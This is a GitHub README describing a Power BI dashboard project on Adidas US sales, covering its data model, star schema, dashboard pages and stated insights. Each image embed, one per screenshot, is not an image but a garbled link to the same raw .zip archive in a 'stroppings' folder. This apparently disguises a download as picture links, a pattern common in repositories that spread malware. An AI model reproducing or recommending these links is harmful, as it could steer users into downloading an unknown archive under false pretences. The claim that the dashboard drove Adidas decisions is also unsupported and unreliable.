# Adidas US Sales Analysis Power BI Project
![](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Background%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
## Introduction
This project was developed during my **Analytics Extra mentorship program** :㊗️, aimed at enhancing my data analytics and business intelligence skills. The focus was on creating a visually engaging and interactive dashboard to analyze Adidas US sales data. Leveraging Power BI, I incorporated advanced data modeling, data transformation, and report design techniques. 

This repository showcases the steps I took to reproduce the project, from data preparation to deploying the dashboard on Microsoft Fabric.

---

## Problem Statement
Adidas needs a comprehensive dashboard to monitor sales performance across various products, regions, and retailers in the United States. The goal was to:
1. Identify top-performing regions, products, and sales channels.
2. Provide actionable insights into sales trends, profitability, and operational efficiency.
3. Enable stakeholders to interact with the data dynamically and intuitively.

---

## Skills and Concepts Applied
- **Power Query:** Data cleaning and transformation.
- **Data Modeling:** Created a star schema with 3 dimension tables and 1 fact table.
- **Data Analysis Expressions (DAX):** Developed measures and calculated columns for dynamic insights.
- **Interactive Dashboard Design:** Designed multiple pages (Home Page, Product Page, Deep Insights Page, and Tooltips) for intuitive navigation.
- **Microsoft Fabric:** Published the dashboard and implemented deployment pipelines (development, testing, and production stages).
- **Visualization Best Practices:** Used color schemes, slicers, and interactive visuals to enhance the user experience.

---

## Data Overview
The dataset included three tables in an Excel workbook:

1. **Data Sales Adidas (Fact Table):**
   - Fields: Retailer, Retailer ID, Invoice Date, Location Key, Product, Price Per Unit, Units Sold, Total Sales, Operating Profit, Operating Margin, Sales Method.

2. **Product (Dimension Table):**
   - Fields: Product, Image URL.

3. **Location (Dimension Table):**
   - Fields: Region, State, City, Location Key.

---

### **Data Model**
The final data model was a star schema with the following relationships:
- Fact Table: `Data Sales Adidas`.
- Dimension Tables: `Product`, `Location`, and a Date Table (created using DAX).
- Relationships: One-to-Many relationships connecting the fact table to the dimension tables.

![Data Model](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Data%20Model%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)

---

## Dashboard Overview

### **1. Home Page**
   - Overview of the dashboard with a slicer for region-based filtering.
   - Interactive map showing sales performance by state.

![Home Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Home%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)

### **2. Product Page**
   - Dynamic visualizations of product-level performance.
   - A slicer for filtering products with an interactive display of product images.

![Product Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Product%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)

### **3. Deep Insights Page**
   - Detailed analysis of profitability and sales trends.
   - Visualizations included bar charts, line graphs, and KPIs.

![Deep Insights Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Deep%20Insight%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)

### **4. Tooltip Pages**
   - Contextual insights embedded within visuals.
   - Hover-over details for granular exploration.

![Tooltip Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20State%20Tooltip%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)

---

## Results and Analysis
Key insights derived from the dashboard:
1. **Top States:** Identified regions with the highest total sales and profitability.
2. **Product Trends:** Analyzed best-selling products and their contribution to revenue.
3. **Retailer Insights:** Compared sales performance across different retailers.

These insights enabled Adidas to focus on high-performing regions and optimize inventory management.


---

## Conclusion
This project demonstrated the power of interactive dashboards in providing actionable insights for businesses. By utilizing Power BI and Microsoft Fabric, I created a professional-grade dashboard that is dynamic, visually appealing, and insightful.


